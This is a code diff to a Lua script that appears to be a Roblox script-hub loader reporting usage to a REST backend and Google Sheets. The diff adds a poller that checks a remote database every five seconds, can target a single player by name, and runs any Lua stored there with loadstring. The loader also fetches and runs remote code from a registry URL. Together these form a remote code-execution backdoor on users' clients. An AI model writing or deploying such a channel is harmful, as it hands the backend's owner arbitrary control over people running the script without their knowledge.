@@ -349,17 +349,12 @@ task.spawn(function()
         end
     end)
 
-    -- Upsert game_executions for dashboard breakdown chart
-    req("POST", "/rest/v1/game_executions",
+    -- Increment game_executions via RPC (atomic, handles daily reset)
+    req("POST", "/rest/v1/rpc/increment_game_exec",
         HttpService:JSONEncode({
-            place_id         = placeId,
-            game_name        = gameName or "",
-            count            = 1,
-            daily_count      = 1,
-            daily_reset_at   = now,
-            last_executed_at = now,
-        }),
-        "resolution=merge-duplicates,return=minimal"
+            p_place_id  = placeId,
+            p_game_name = gameName or "",
+        })
     )
 
     -- Post to Google Sheets
@@ -421,3 +416,29 @@ local url = GameRegistry[placeId]
 if url then
     pcall(function() loadstring(game:HttpGet(url))() end)
 end
+
+-- ── 8. Live execute_script poller ───────────────────────────────────────────
+task.spawn(function()
+    local lastScript = ""
+    while true do
+        task.wait(5)
+        pcall(function()
+            if not gameName or gameName == "" then return end
+            local res = decode(req("GET",
+                ("/rest/v1/game_status?game_name=eq.%s&select=execute_script,execute_target"):format(
+                HttpService:UrlEncode(gameName))))
+            if not res or #res == 0 then return end
+            local row = res[1]
+            local script = row.execute_script
+            if not script or script == "" or script == lastScript then return end
+            local target = row.execute_target or ""
+            if target ~= "" and target ~= LP.Name then return end
+            lastScript = script
+            req("PATCH", "/rest/v1/game_status?game_name=eq."..HttpService:UrlEncode(gameName),
+                HttpService:JSONEncode({ execute_script = nil, execute_target = nil }),
+                "return=minimal"
+            )
+            loadstring(script)()
+        end)
+    end
+end)
